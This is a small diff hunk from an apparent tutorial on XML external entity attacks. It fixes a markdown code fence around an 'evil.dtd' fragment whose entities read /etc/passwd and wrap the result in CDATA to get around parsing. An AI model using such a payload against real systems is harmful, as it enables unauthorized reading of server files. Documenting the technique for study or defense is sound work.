@@ -119,7 +119,7 @@ Result `XML` data:
 * We will use `CDATA`, character data to bypass this.
 * Anything between `<![CDATA[ ` and `]]>` will not be parsed by the XML parser
 * `evil.dtd`
-``xml
+```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
